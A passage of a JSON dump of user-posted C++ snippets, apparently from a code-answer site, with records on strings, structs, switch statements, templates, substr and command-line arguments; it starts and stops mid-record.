    "description": "#include <sstream> #include <vector> #include <string>  std::string myString = \"10 15 20 23\"; std::stringstream iss( myString );  int number; std::vector<int> myNumbers; while ( iss >> number )   myNumbers.push_back( number );\n",
    "reg_date": "2021-10-12T11:38:41.000Z"
  },
  {
    "id": 1246,
    "keyword": null,
    "link": null,
    "title": " c++ string with character array",
    "description": " #include <cstring>       strcpy(char_array, s.c_str());      \n",
    "reg_date": "2021-10-12T11:38:41.000Z"
  },
  {
    "id": 1247,
    "keyword": null,
    "link": null,
    "title": " c++ strings",
    "description": "std::string str = \"hello world\";  char *str = \"hello world\"; char str[] = \"hello world\";  char str[11] = \"hello world\"; \n#include <iostream> #include <string>//for printing std::string int main()  { \t//A string is a group of characters and an array of const chars \tconst char* name = \"Caleb\";//C style string \t//how string actually works below: \t//String without null terminating character below:  \tchar name2[5] = { 'C','a','l','e','b' };// string is just an array of characters \t//The above doesn't have an null termination character at the end cout will not now where the string ends and will acess memory that is not a part of your string \tstd::cout << name2 << std::endl;//output => Caleb + somejunk //this is because null terminating char is not present at the end of array \t//String with null terminating character below:  \tchar name3[6] = { 'C','a','l','e','b','\\0' };//null terminating char '\\0' or '0' can be used  \tstd::cout << name3 << std::endl;//output => Caleb // because null terminating char is present cout knows where array ends   \t//std::string class in c++ is takes an array of const chars and a bunch of functions to manuplate it: \t//std::string has a constructor  that takes const char array \tstd::string name4 = \"Caleb\"; \tname4.size();//gives size of string and there are many more methods in std::string class \t   //appending to std::string      \t//\"Ever thing inside these double quotes becomes const char array\"    //std::string namee = \"Caleb\" +\"Hello\";//This will give error because adding const char array to const char array  \tstd::string namee = \"Caleb\"; \tnamee += \" Hello\";//This will work because adding a ptr to a actual string \tstd::cout << namee << std::endl; //You can also use the below \tstd::string namee2 = std::string(\"Caleb\")+\" Hello\";// This will work because constructor will convert const char array  to string, adding a ptr to string \tstd::cout << namee2 << std::endl;     std::cin.get();  }\n#include <string>  std::string myString = \"Hello, World!\";\n#include <iostream>  using namespace std;  void display(char *); void display(string);  int main() {     string str1;     cout << \"Enter a string: \";     getline(cin, str1);     display(str1);     return 0; }   void display(string s) {     cout << \"Entered string is: \" << s << endl; }\n#include <iostream>  int main() { \tstd::cout << \"Hello\" << std::endl; //endl = end line/new line     // or     printf(\"hello\");      }\n",
    "reg_date": "2021-10-12T11:38:41.000Z"
  },
  {
    "id": 1248,
    "keyword": null,
    "link": null,
    "title": " c++ struct",
    "description": "struct Student {     string Nom;     int Surn;     int Age; };\n//Struct is a compound data type that contains different variables of different types. struct Student {     char stuName[30];     int stuRollNo;     int stuAge; }; \nstruct product {   int weight;   double price; } ;  product apple; product banana, melon;\n #include <bits/stdc++.h> #include <iostream>  #define ll long long  using namespace std;  struct student{ \tint roll; \tstring name; \tint age; \t \tvoid studentDetails(){ \t\tcout<<\"Name is \"<<name<<\" Age is \"<<age<<\" roll no is \"<<roll<<endl; \t} };   int main(){ \t \tstudent sumant; \tsumant.roll = 30; \tsumant.name = \"Sumant Tirkey\"; \tsumant.age = 18; \t \tsumant.studentDetails(); \tcout<<endl;      return 0; }\n struct Rectangle {     int width;  // member variable     int height; // member variable      // C++ constructors     Rectangle()     {         width = 1;         height = 1;     }      Rectangle( int width_  )     {         width = width_;         height = width_ ;     }      Rectangle( int width_ , int height_ )     {         width = width_;         height = height_;     }     // ... };  \n#include<iostream> #include<string> using namespace std; struct student {   char name [20]; int age; float marks; }; int main() { student s; cout<<\"enter student name : \"<<endl; cin>>s.name; cout<<\"enter age : \"<<endl; cin>>s.age; cout<<\"enter marks : \"<<endl; cin>>s.marks; cout<<\"***********************\"<<endl; cout<<\"name : \"<<s.name<<endl; cout<<\"age : \"<<s.age<<endl; cout<<\"marks : \"<<s.marks<<endl; return 0; }\n",
    "reg_date": "2021-10-12T11:38:41.000Z"
  },
  {
    "id": 1249,
    "keyword": null,
    "link": null,
    "title": " c++ struct constructor",
    "description": "struct TestStruct {         int id;         TestStruct() : id(42)         {         } }; \n struct Rectangle {     int width;  // member variable     int height; // member variable      // C++ constructors     Rectangle()     {         width = 1;         height = 1;     }      Rectangle( int width_  )     {         width = width_;         height = width_ ;     }      Rectangle( int width_ , int height_ )     {         width = width_;         height = height_;     }     // ... };  \n#include<iostream> #include<string> using namespace std; struct student {   char name [20]; int age; float marks; }; int main() { student s; cout<<\"enter student name : \"<<endl; cin>>s.name; cout<<\"enter age : \"<<endl; cin>>s.age; cout<<\"enter marks : \"<<endl; cin>>s.marks; cout<<\"***********************\"<<endl; cout<<\"name : \"<<s.name<<endl; cout<<\"age : \"<<s.age<<endl; cout<<\"marks : \"<<s.marks<<endl; return 0; }\n",
    "reg_date": "2021-10-12T11:38:41.000Z"
  },
  {
    "id": 1250,
    "keyword": null,
    "link": null,
    "title": " c++ struct vs class",
    "description": "// In C++, a class and a struct are COMPLETELY IDENTICAL // Except structs default to PUBLIC access and inheritance // Whereas class defaults to PRIVATE.\n1) Members of a class are private by default and members of a struct are public by default. For example program 1 fails in compilation and program 2 works fine.  / Program 1  #include <stdio.h>     class Test {      int x; // x is private  };  int main()  {    Test t;    t.x = 20; // compiler error because x is private    getchar();    return 0;  }   // Program 2  #include <stdio.h>     struct Test {      int x; // x is public  };  int main()  {    Test t;    t.x = 20; // works fine because x is public    getchar();    return 0;  } \n",
    "reg_date": "2021-10-12T11:38:42.000Z"
  },
  {
    "id": 1251,
    "keyword": null,
    "link": null,
    "title": " c++ suare",
    "description": "#include <math.h> pow(a,b)\n",
    "reg_date": "2021-10-12T11:38:42.000Z"
  },
  {
    "id": 1252,
    "keyword": null,
    "link": null,
    "title": " c++ substr",
    "description": "s.substr(pos,len);\n// string::substr #include <iostream> #include <string>  int main () {   std::string str=\"We think in generalities, but we live in details.\";                                            // (quoting Alfred N. Whitehead)    std::string str2 = str.substr (3,5);     // \"think\"    std::size_t pos = str.find(\"live\");      // position of \"live\" in str    std::string str3 = str.substr (pos);     // get from \"live\" to the end    std::cout << str2 << ' ' << str3 << '\\n';    return 0; }\n#include <string> #include <iostream>   int main() {     std::string a = \"0123456789abcdefghij\";       // count is npos, returns [pos, size())     std::string sub1 = a.substr(10);     std::cout << sub1 << '\\n';       // both pos and pos+count are within bounds, returns [pos, pos+count)     std::string sub2 = a.substr(5, 3);     std::cout << sub2 << '\\n';       // pos is within bounds, pos+count is not, returns [pos, size())      std::string sub4 = a.substr(a.size()-3, 50);     // this is effectively equivalent to     // std::string sub4 = a.substr(17, 3);     // since a.size() == 20, pos == a.size()-3 == 17, and a.size()-pos == 3       std::cout << sub4 << '\\n';       try {         // pos is out of bounds, throws         std::string sub5 = a.substr(a.size()+3, 50);         std::cout << sub5 << '\\n';     } catch(const std::out_of_range& e) {         std::cout << \"pos exceeds string size\\n\";     } }\nstring sub_string=main_string.substr(first_pos_of_the_substring_from_main_string,length_of_the_substring_from_main_string_starting_from_the_first_position\n",
    "reg_date": "2021-10-12T11:38:42.000Z"
  },
  {
    "id": 1253,
    "keyword": null,
    "link": null,
    "title": " c++ substring",
    "description": "s.substr(pos,len);\n// string::substr #include <iostream> #include <string>  int main () {   std::string str=\"We think in generalities, but we live in details.\";                                            // (quoting Alfred N. Whitehead)    std::string str2 = str.substr (3,5);     // \"think\"    std::size_t pos = str.find(\"live\");      // position of \"live\" in str    std::string str3 = str.substr (pos);     // get from \"live\" to the end    std::cout << str2 << ' ' << str3 << '\\n';    return 0; }\n#include <string> #include <iostream>   int main() {     std::string a = \"0123456789abcdefghij\";       // count is npos, returns [pos, size())     std::string sub1 = a.substr(10);     std::cout << sub1 << '\\n';       // both pos and pos+count are within bounds, returns [pos, pos+count)     std::string sub2 = a.substr(5, 3);     std::cout << sub2 << '\\n';       // pos is within bounds, pos+count is not, returns [pos, size())      std::string sub4 = a.substr(a.size()-3, 50);     // this is effectively equivalent to     // std::string sub4 = a.substr(17, 3);     // since a.size() == 20, pos == a.size()-3 == 17, and a.size()-pos == 3       std::cout << sub4 << '\\n';       try {         // pos is out of bounds, throws         std::string sub5 = a.substr(a.size()+3, 50);         std::cout << sub5 << '\\n';     } catch(const std::out_of_range& e) {         std::cout << \"pos exceeds string size\\n\";     } }\nstring sub_string=main_string.substr(first_pos_of_the_substring_from_main_string,length_of_the_substring_from_main_string_starting_from_the_first_position\n",
    "reg_date": "2021-10-12T11:38:42.000Z"
  },
  {
    "id": 1254,
    "keyword": null,
    "link": null,
    "title": " c++ sum of all numbers up to a number",
    "description": "// Method 1: Mathematical -> Sum up numbers from 1 to n  int sum(int n){ \treturn (n * (n+1)) / 2; }  // Method 2: Using a for-loop -> Sum up numbers from 1 to n  int sum(int n){ \tint tempSum = 0;    \tfor (int i = n; i > 0; i--){      \ttempSum += i;       }   \treturn tempSum;  }  // Method 3: Using recursion -> Sum up numbers from 1 to n  int sum(int n){ \treturn n > 0 ? n + sum(n-1) : 0;  }\n",
    "reg_date": "2021-10-12T11:38:42.000Z"
  },
  {
    "id": 1255,
    "keyword": null,
    "link": null,
    "title": " c++ sum of even and odd numbers",
    "description": "//given the fact that it takes n of number void sumEvenAndOdd(){ int n=0 , evenSum=0 , oddSum=0;      int numbers[Size];      cout<<\"enters the number(N) of integers\\n\";      cin>>Size;       cout<<\"Enter \"<<Size<<\" number/s:\\n\";      for(int i =0 ;i< Size ; ++i){         cin>>numbers[i];      }      for(int i =0 ;i<Size ; ++i){         if(numbers[i]%2 ==0){             evenSum += numbers[i];         }         else{             oddSum += numbers[i];         }      }      cout<<\"the sum of even numbers is : \"<<evenSum <<\"\\nthe sum of odd numbers is :\"<<oddSum<<endl; }\n",
    "reg_date": "2021-10-12T11:38:42.000Z"
  },
  {
    "id": 1256,
    "keyword": null,
    "link": null,
    "title": " c++ sum up numbers",
    "description": "// Method 1: Mathematical -> Sum up numbers from 1 to n  int sum(int n){ \treturn (n * (n+1)) / 2; }  // Method 2: Using a for-loop  -> Sum up numbers from 1 to n  int sum(int n){ \tint tempSum = 0;    \tfor (int i = n; i > 0; i--){      \ttempSum += i;       }   \treturn tempSum;  }  // Method 3: Using recursion -> Sum up numbers from 1 to n  int sum(int n){ \treturn n > 0 ? n + sum(n-1) : 0;  }\n// Method 1: Mathematical -> Sum up numbers from 1 to n  int sum(int n){ \treturn (n * (n+1)) / 2; }  // Method 2: Using a for-loop -> Sum up numbers from 1 to n  int sum(int n){ \tint tempSum = 0;    \tfor (int i = n; i > 0; i--){      \ttempSum += i;       }   \treturn tempSum;  }  // Method 3: Using recursion -> Sum up numbers from 1 to n  int sum(int n){ \treturn n > 0 ? n + sum(n-1) : 0;  }\n#include<iostream> using namespace std; int main() { \tdouble number1,number2;   \tdouble sum0;   \tsum=number1+number2;   \tcout<<sum; }\n",
    "reg_date": "2021-10-12T11:38:42.000Z"
  },
  {
    "id": 1257,
    "keyword": null,
    "link": null,
    "title": " c++ swap function",
    "description": "int a{}, b{}, temp{}; cin >> a >> b;    //===================== METHOD-1    temp = a;    a = b;    b = temp;    //===================== METHOD-2 ( XOR ^ )   // example: a^b =  5^7    a = a ^ b;   // 5^7    b = a ^ b;   // 5 ^ 7 ^ 7  //5 ( 7 & 7 dismissed)    a = a ^ b;   // 5 ^ 7 ^ 5  //7 ( 5 & 5 dismissed)    //===================== METHOD-3  ( swap() )   swap(a, b);    cout << \"a \" << a << endl;   cout << \"b \" << b << endl; \nReturn Value: The function does not return anything, it swaps the values of the two variables\nint main() { \tint a = 5; \tint b = 10;    \tswap(a, b);    \tcout << \"a = \" << a << endl; \tcout << \"b = \" << b << endl; }\n",
    "reg_date": "2021-10-12T11:38:42.000Z"
  },
  {
    "id": 1258,
    "keyword": null,
    "link": null,
    "title": " c++ switch",
    "description": "switch(expression) {   case x:     // code block     break;   case y:     // code block     break;   default:     // code block }\nswitch(a) {   case -1:     std::cout << \"a == -1\" << std::endl;   break;    case 0:     std::cout << \"a == 0\" << std::endl;   break;    default:     std::cout << \"a is something else\" << std::endl; }\nswitch (n) {     case 1: // code to be executed if n = 1;         break;     case 2: // code to be executed if n = 2;         break;     default: // code to be executed if n doesn't match any cases }\nswitch(expression) {    case 1:       //equivalent to if(expression == 1){//do someting...}       //do something...       break;      //if case 1 is true the rest of the statments arn't      //evaluated because of the break    case 45:       //equivalent to else if(expression == 45){//do someting...}       //do something...       break;         // you can have any number of case statements and default has to be last    default :       // equivalent to else{//do someting...}       //do something... }  switch(expression) {    case 1:       //equivalent to if(expression == 1){//do someting...}       //do something...    case 45:       //equivalent to if(expression == 45){//do someting...}       //do something...    default :       //always runs if there are no breaks in any of the cases       //do something... }  //modification of answer by Homeless Hoopoe\nswitch(expression) {    case constant-expression  :       statement(s);       break; //optional    case constant-expression  :       statement(s);       break; //optional       // you can have any number of case statements.    default : //Optional       statement(s); } \nswitch (<espressione>) { case <valore costante 1>: // istruzioni break;   case <valore costante 2>: // istruzioni break; ... case <valore costante N>: // istruzioni break; default: // istruzioni break; }\n",
    "reg_date": "2021-10-12T11:38:42.000Z"
  },
  {
    "id": 1259,
    "keyword": null,
    "link": null,
    "title": " c++ switch case",
    "description": "switch(expression) {   case x:     // code block     break;   case y:     // code block     break;   default:     // code block }\nswitch (n) {     case 1: // code to be executed if n = 1;         break;     case 2: // code to be executed if n = 2;         break;     default: // code to be executed if n doesn't match any cases }\nswitch(expression) {    case 1:       //equivalent to if(expression == 1){//do someting...}       //do something...       break;      //if case 1 is true the rest of the statments arn't      //evaluated because of the break    case 45:       //equivalent to else if(expression == 45){//do someting...}       //do something...       break;         // you can have any number of case statements and default has to be last    default :       // equivalent to else{//do someting...}       //do something... }  switch(expression) {    case 1:       //equivalent to if(expression == 1){//do someting...}       //do something...    case 45:       //equivalent to if(expression == 45){//do someting...}       //do something...    default :       //always runs if there are no breaks in any of the cases       //do something... }  //modification of answer by Homeless Hoopoe\nswitch(expression) {    case constant-expression  :       statement(s);       break; //optional    case constant-expression  :       statement(s);       break; //optional       // you can have any number of case statements.    default : //Optional       statement(s); } \n#include <iostream> using namespace std; int main(){    int num = 5;    switch(num + 2) {       case 1:          cout << \"Case1: Value is: \" << num << endl;       case 2:          cout << \"Case2: Value is: \" << num << endl;       case 3:          cout << \"Case3: Value is: \" << num << endl;       default:          cout << \"Default: Value is: \" << num << endl;    }    return 0; }\nswitch(expr) {   case 1:     // do something     break;   case 2:     // do something     break;   default:     // do something }\n",
    "reg_date": "2021-10-12T11:38:43.000Z"
  },
  {
    "id": 1260,
    "keyword": null,
    "link": null,
    "title": " c++ switch case statement",
    "description": "switch (n) {     case 1: // code to be executed if n = 1;         break;     case 2: // code to be executed if n = 2;         break;     default: // code to be executed if n doesn't match any cases }\nswitch(expression) {    case constant-expression  :       statement(s);       break; //optional    case constant-expression  :       statement(s);       break; //optional       // you can have any number of case statements.    default : //Optional       statement(s); } \n",
    "reg_date": "2021-10-12T11:38:43.000Z"
  },
  {
    "id": 1261,
    "keyword": null,
    "link": null,
    "title": " c++ switch multiple cases",
    "description": "#include <iostream>  using namespace std;     int main() {      // variable declaration  \tint input; \tswitch(input){ \tcase 1: case 2: case 3: case 4: \t\t//executes if input is 1, 2, 3, or 4 \t\tbreak; \tcase 5: case 6: case 7: \t\t//executes if input is 5, 6, or 7         break; \tdefault: \t\t//executes if input isn't any of the cases     }     return 0;  } \n",
    "reg_date": "2021-10-12T11:38:43.000Z"
  },
  {
    "id": 1262,
    "keyword": null,
    "link": null,
    "title": " c++ switch statement",
    "description": "switch(expression) {   case x:     // code block     break;   case y:     // code block     break;   default:     // code block }\nswitch (n) {     case 1: // code to be executed if n = 1;         break;     case 2: // code to be executed if n = 2;         break;     default: // code to be executed if n doesn't match any cases }\nswitch(expression) {    case 1:       //equivalent to if(expression == 1){//do someting...}       //do something...       break;      //if case 1 is true the rest of the statments arn't      //evaluated because of the break    case 45:       //equivalent to else if(expression == 45){//do someting...}       //do something...       break;         // you can have any number of case statements and default has to be last    default :       // equivalent to else{//do someting...}       //do something... }  switch(expression) {    case 1:       //equivalent to if(expression == 1){//do someting...}       //do something...    case 45:       //equivalent to if(expression == 45){//do someting...}       //do something...    default :       //always runs if there are no breaks in any of the cases       //do something... }  //modification of answer by Homeless Hoopoe\nswitch(expression) {    case constant-expression  :       statement(s);       break; //optional    case constant-expression  :       statement(s);       break; //optional       // you can have any number of case statements.    default : //Optional       statement(s); } \n#include <iostream> using namespace std; int main(){    int num = 5;    switch(num + 2) {       case 1:          cout << \"Case1: Value is: \" << num << endl;       case 2:          cout << \"Case2: Value is: \" << num << endl;       case 3:          cout << \"Case3: Value is: \" << num << endl;       default:          cout << \"Default: Value is: \" << num << endl;    }    return 0; }\nc++ switch case statement\n",
    "reg_date": "2021-10-12T11:38:43.000Z"
  },
  {
    "id": 1263,
    "keyword": null,
    "link": null,
    "title": " c++ switch string",
    "description": "switch(str2int(\"my string\")) {   case str2int(\"my string\")):     {     }     break; }  constexpr unsigned int str2int(const char* str, int h = 0) {     return !str[h] ? 5381 : (str2int(str, h+1) * 33) ^ str[h]; } \nswitch(expr) {   case 1:     // do something     break;   case 2:     // do something     break;   default:     // do something }\n",
    "reg_date": "2021-10-12T11:38:43.000Z"
  },
  {
    "id": 1264,
    "keyword": null,
    "link": null,
    "title": " c++ synchronization primitives example programs",
    "description": "  #include <queue> #include <memory> #include <mutex> #include <condition_variable> template<typename T> class threadsafe_queue { private:     mutable std::mutex mut;      ❶      std::queue<T> data_queue;     std::condition_variable data_cond; public:     threadsafe_queue()     {}     threadsafe_queue(threadsafe_queue const& other)     {         std::lock_guard<std::mutex> lk(other.mut);         data_queue=other.data_queue;     }     void push(T new_value)     {         std::lock_guard<std::mutex> lk(mut);         data_queue.push(new_value);         data_cond.notify_one();     }     void wait_and_pop(T& value)     {         std::unique_lock<std::mutex> lk(mut);         data_cond.wait(lk,[this]{return !data_queue.empty();});         value=data_queue.front();         data_queue.pop();     }     std::shared_ptr<T> wait_and_pop()     {         std::unique_lock<std::mutex> lk(mut);         data_cond.wait(lk,[this]{return !data_queue.empty();});         std::shared_ptr<T> res(std::make_shared<T>(data_queue.front()));         data_queue.pop();         return res;     }     bool try_pop(T& value)     {         std::lock_guard<std::mutex> lk(mut);         if(data_queue.empty())             return false;         value=data_queue.front();         data_queue.pop();         return true;     }     std::shared_ptr<T> try_pop()     {         std::lock_guard<std::mutex> lk(mut);         if(data_queue.empty())             return std::shared_ptr<T>();         std::shared_ptr<T> res(std::make_shared<T>(data_queue.front()));         data_queue.pop();         return res;     }     bool empty() const     {         std::lock_guard<std::mutex> lk(mut);         return data_queue.empty();     } };   \n",
    "reg_date": "2021-10-12T11:38:43.000Z"
  },
  {
    "id": 1265,
    "keyword": null,
    "link": null,
    "title": " c++ tab",
    "description": "cout << \"Hello \" << '\\t'<<\"world\"; //Hello \tworld \n",
    "reg_date": "2021-10-12T11:38:43.000Z"
  },
  {
    "id": 1266,
    "keyword": null,
    "link": null,
    "title": " c++ take command line arguments",
    "description": "// command line arguments in c++ are stored in an array of c-strings // # of arguments: argc // actual arguments: argv  #include <iostream> using namespace std;  int main(int argc, char** argv){   for(int i = 0; i < argc; i++){     cout << \"argv\" << i << \": \" << argv[i] << endl;   }   return 0; }  /*  ./main.exe hello world  argv0: main.exe argv1: hello argv2: world  */     \n#include <iostream> #include <cstdarg> using namespace std;  double average(int num,...) {    va_list valist;               // A place to store the list of arguments (valist)    double sum = 0.0;    int i;        va_start(valist, num);        // Initialize valist for num number of arguments    for (i = 0; i < num; i++) {   // Access all the arguments assigned to valist       sum += va_arg(valist, int);    }    va_end(valist);               // Clean memory reserved for valist        return sum/num; }  int main() {    cout << \"[Average 3 numbers: 44,55,66] -> \" << average(3, 44,55,66) << endl;    cout << \"[Average 2 numbers: 10,11] -> \" << average(2, 10,11) << endl;     cout << \"[Average 1 number:  18] -> \" << average(1, 18) << endl;  }  /* NOTE: You will need to use the following 'data_types' within the function va_list   :  A place to store the list of arguments (valist) va_start  :  Initialize valist for num number of arguments va_arg    :  Access all the arguments assigned to valist va_end    :  Clean memory reserved for valist */\n// Use command lines  int main(int argc, char *argv[]) {  \tfor(int i = 1; i < argc; i++){ \t\tif(!strcmp(argv[i], \"-h\") || !strcmp(argv[i], \"--help\") ){ \t\t\tprintf(\"Usage: App <options>\\nOptions are:\\n\"); \t\t\tprintf(\"Option list goes here\"); \t\t\texit(0); \t\t}else if(!strcmp(argv[i], \"-c\") || !strcmp(argv[i], \"--custom\")){ \t\t\tprintf(\"argument accepted\"); \t\t}else{ \t\t\tif(i == argc-1){ \t\t\t\tbreak; \t\t\t} \t\t\tMessageBox(NULL, TEXT(\"ERROR: Invalid Command Line Option Found: \\\"%s\\\".\\n\", argv[i]), TEXT(\"Error\"), MB_ICONERROR | MB_OK); \t\t} \t}  \tMessageBox(NULL, TEXT(\"ERROR: No Command Line Option Found. Type in --hep or -h\"), TEXT(\"Error\"), MB_ICONERROR | MB_OK); }\n",
    "reg_date": "2021-10-12T11:38:43.000Z"
  },
  {
    "id": 1267,
    "keyword": null,
    "link": null,
    "title": " c++ template",
    "description": "#include <iostream> using namespace std;  template <typename T> void Swap(T &n1, T &n2) { \tT temp; \ttemp = n1; \tn1 = n2; \tn2 = temp; }  int main() { \tint i1 = 1, i2 = 2; \tfloat f1 = 1.1, f2 = 2.2; \tchar c1 = 'a', c2 = 'b';  \tcout << \"Before passing data to function template.\\n\"; \tcout << \"i1 = \" << i1 << \"\\ni2 = \" << i2; \tcout << \"\\nf1 = \" << f1 << \"\\nf2 = \" << f2; \tcout << \"\\nc1 = \" << c1 << \"\\nc2 = \" << c2;  \tSwap(i1, i2); \tSwap(f1, f2); \tSwap(c1, c2);          cout << \"\\n\\nAfter passing data to function template.\\n\"; \tcout << \"i1 = \" << i1 << \"\\ni2 = \" << i2; \tcout << \"\\nf1 = \" << f1 << \"\\nf2 = \" << f2; \tcout << \"\\nc1 = \" << c1 << \"\\nc2 = \" << c2;  \treturn 0; } \n// function template #include <iostream> using namespace std;  template <class T> T GetMax (T a, T b) {   T result;   result = (a>b)? a : b;   return (result); }  int main () {   int i=5, j=6, k;   long l=10, m=5, n;   k=GetMax<int>(i,j);   n=GetMax<long>(l,m);   cout << k << endl;   cout << n << endl;   return 0; }\n// template specialization #include <iostream> using namespace std;  // class template: template <class T> class mycontainer {     T element;   public:     mycontainer (T arg) {element=arg;}     T increase () {return ++element;} };  // class template specialization: template <> class mycontainer <char> {     char element;   public:     mycontainer (char arg) {element=arg;}     char uppercase ()     {       if ((element>='a')&&(element<='z'))       element+='A'-'a';       return element;     } };  int main () {   mycontainer<int> myint (7);   mycontainer<char> mychar ('j');   cout << myint.increase() << endl;   cout << mychar.uppercase() << endl;   return 0; }\ntemplate <class T> class mypair {     T values [2];   public:     mypair (T first, T second)     {       values[0]=first; values[1]=second;     } };\ntemplate <class myType> myType GetMax (myType a, myType b) {  return (a>b?a:b); }\nint x,y; GetMax <int> (x,y);\n// class templates #include <iostream> using namespace std;  template <class T> class mypair {     T a, b;   public:     mypair (T first, T second)       {a=first; b=second;}     T getmax (); };  template <class T> T mypair<T>::getmax () {   T retval;   retval = a>b? a : b;   return retval; }  int main () {   mypair <int> myobject (100, 75);   cout << myobject.getmax();   return 0; }\n// function template II #include <iostream> using namespace std;  template <class T> T GetMax (T a, T b) {   return (a>b?a:b); }  int main () {   int i=5, j=6, k;   long l=10, m=5, n;   k=GetMax(i,j);   n=GetMax(l,m);   cout << k << endl;   cout << n << endl;   return 0; }\n// sequence template #include <iostream> using namespace std;  template <class T, int N> class mysequence {     T memblock [N];   public:     void setmember (int x, T value);     T getmember (int x); };  template <class T, int N> void mysequence<T,N>::setmember (int x, T value) {   memblock[x]=value; }  template <class T, int N> T mysequence<T,N>::getmember (int x) {   return memblock[x]; }  int main () {   mysequence <int,5> myints;   mysequence <double,5> myfloats;   myints.setmember (0,100);   myfloats.setmember (3,3.1416);   cout << myints.getmember(0) << '\\n';   cout << myfloats.getmember(3) << '\\n';   return 0; }\n#include <bits/stdc++.h> using namespace std; template <class T> class Vector{     public:         T *arr;         T size;          Vector(int size){             this->size = size;             arr = new T[size];         }         T dotProduct(Vector &v){             T d = 0;             for(int i = 0; i<size; i++){                 d += this->arr[i] * v.arr[i];             }             return d;         } }; int main(){     Vector<int> v1(3);     v1.arr[0] = 1;     v1.arr[1] = 2;     v1.arr[2] = 3;     Vector<int> v2(3);     v2.arr[0] = 4;     v2.arr[1] = 5;     v2.arr[2] = 6;     int a = v1.dotProduct(v2);     cout<<a<<endl;     Vector<float> v3(3);     v3.arr[2] = 3.2;     v3.arr[0] = 1.2;     v3.arr[1] = 2.2;     Vector<float> v4(3);     v4.arr[0] = 4.4;     v4.arr[1] = 5.4;     v4.arr[2] = 6.4;     float a1 = v3.dotProduct(v4);     cout<<a1<<endl;      return 0; }\n",
    "reg_date": "2021-10-12T11:38:43.000Z"
  },
  {
    "id": 1268,
    "keyword": null,
    "link": null,
    "title": " c++ template function",
    "description": "template <class T> void swap(T & lhs, T & rhs) {  T tmp = lhs;  lhs = rhs;  rhs = tmp; }\ntemplate <class T> void swap(T & lhs, T & rhs) {  T tmp = lhs;  lhs = rhs;  rhs = tmp; }  void main() {   int a = 6;   int b = 42;   swap<int>(a, b);   printf(\"a=%d, b=%d\\n\", a, b);      // Implicit template parameter deduction   double f = 5.5;   double g = 42.0;   swap(f, g);   printf(\"f=%f, g=%f\\n\", f, g); }  /* Output: a=42, b=6 f=42.0, g=5.5 */\n#include <iostream> using namespace std;  template <typename T> void Swap(T &n1, T &n2) { \tT temp; \ttemp = n1; \tn1 = n2; \tn2 = temp; }  int main() { \tint i1 = 1, i2 = 2; \tfloat f1 = 1.1, f2 = 2.2; \tchar c1 = 'a', c2 = 'b';  \tcout << \"Before passing data to function template.\\n\"; \tcout << \"i1 = \" << i1 << \"\\ni2 = \" << i2; \tcout << \"\\nf1 = \" << f1 << \"\\nf2 = \" << f2; \tcout << \"\\nc1 = \" << c1 << \"\\nc2 = \" << c2;  \tSwap(i1, i2); \tSwap(f1, f2); \tSwap(c1, c2);          cout << \"\\n\\nAfter passing data to function template.\\n\"; \tcout << \"i1 = \" << i1 << \"\\ni2 = \" << i2; \tcout << \"\\nf1 = \" << f1 << \"\\nf2 = \" << f2; \tcout << \"\\nc1 = \" << c1 << \"\\nc2 = \" << c2;  \treturn 0; } \n// function template #include <iostream> using namespace std;  template <class T> T GetMax (T a, T b) {   T result;   result = (a>b)? a : b;   return (result); }  int main () {   int i=5, j=6, k;   long l=10, m=5, n;   k=GetMax<int>(i,j);   n=GetMax<long>(l,m);   cout << k << endl;   cout << n << endl;   return 0; }\n// template function template <class T> T Large(T n1, T n2) { \treturn (n1 > n2) ? n1 : n2; }\ntemplate <typename T> void Swap(T &n1, T &n2) { \tT temp; \ttemp = n1; \tn1 = n2; \tn2 = temp; }\n",
    "reg_date": "2021-10-12T11:38:44.000Z"
  },
  {
    "id": 1269,
    "keyword": null,
    "link": null,
    "title": " c++ template policy",
    "description": "template<typename... Policies> class PolicyAndVaradic: public Policies... { public:     template<typename... Args>     PolicyAndVaradic(const Args... Arg)         : Policies(Arg)...{} };  class PolicyOne {     std::string mText;  public:     PolicyOne(const char* aText):mText(aText){}          void executePolicyOne()     {         std::cout << mText << std::endl;     } };  class PolicyTwo {     std::string mText; public:      PolicyTwo(const char* aText):mText(aText){}      void executePolicyTwo()     {         std::cout << mText << std::endl;     } };  PolicyOneAndPolicyTwo linstance(\"PolicyOne\", \"PolicyTwo\");  linstance.executePolicyOne();  linstance.executePolicyTwo();\n#include <iostream> #include <string>  template <typename OutputPolicy, typename LanguagePolicy> class HelloWorld : private OutputPolicy, private LanguagePolicy {  public:   // Behavior method.   void Run() const {     // Two policy methods.     Print(Message());   }   private:   using LanguagePolicy::Message;   using OutputPolicy::Print; };  class OutputPolicyWriteToCout {  protected:   template <typename MessageType>   void Print(MessageType&& message) const {     std::cout << message << std::endl;   } };  class LanguagePolicyEnglish {  protected:   std::string Message() const { return \"Hello, World!\"; } };  class LanguagePolicyGerman {  protected:   std::string Message() const { return \"Hallo Welt!\"; } };  int main() {   // Example 1   using HelloWorldEnglish = HelloWorld<OutputPolicyWriteToCout, LanguagePolicyEnglish>;    HelloWorldEnglish hello_world;   hello_world.Run();  // Prints \"Hello, World!\".    // Example 2   // Does the same, but uses another language policy.   using HelloWorldGerman = HelloWorld<OutputPolicyWriteToCout, LanguagePolicyGerman>;    HelloWorldGerman hello_world2;   hello_world2.Run();  // Prints \"Hallo Welt!\". } \ntemplate<typename... Policies> class PolicyAndVariadic: public Policies...{};  class PolicyOne { public:     void executePolicyOne()     {         std::cout << \"execute PolicyOne\" << std::endl;         } };  class PolicyTwo { public:     void executePolicyTwo()     {         std::cout << \"execute PolicyTwo\" << std::endl;     } };  typedef PolicyAndVariadic<PolicyOne, PolicyTwo> PolicyOneAndPolicyTwo;  PolicyOneAndPolicyTwo linstance;  linstance.executePolicyOne();  linstance.executePolicyTwo();\n",
    "reg_date": "2021-10-12T11:38:44.000Z"
  },
  {
    "id": 1270,
    "keyword": null,
    "link": null,
    "title": " c++ template specialization",
    "description": "#include <iostream> template<typename T>   // primary template struct is_void : std::false_type { }; template<>  // explicit specialization for T = void struct is_void<void> : std::true_type { }; int main() {     // for any type T other than void, the      // class is derived from false_type     std::cout << is_void<char>::value << '\\n';      // but when T is void, the class is derived     // from true_type     std::cout << is_void<void>::value << '\\n'; }\n",
    "reg_date": "2021-10-12T11:38:44.000Z"
  },
  {
    "id": 1271,
    "keyword": null,
    "link": null,
    "title": " c++ terminal color",
    "description": "SetConsoleTextAttribute(console, ((int)background * 16) + (int)forground);\n",
    "reg_date": "2021-10-12T11:38:44.000Z"
  },
  {
    "id": 1272,
    "keyword": null,
    "link": null,
    "title": " c++ ternary operator",
